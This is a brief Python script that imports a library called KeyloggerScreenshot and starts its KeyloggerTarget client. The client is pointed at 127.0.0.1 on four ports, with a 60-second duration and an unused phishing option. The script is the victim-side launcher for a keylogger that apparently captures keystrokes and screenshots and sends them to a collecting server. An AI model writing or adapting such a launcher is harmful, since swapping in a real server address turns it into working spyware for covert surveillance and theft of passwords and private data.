import KeyloggerScreenshot as ks 

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 4783, ip, 9872, ip, 3918, ip, 7936, duration_in_seconds=60, phishing_web=None) 
key_client.start()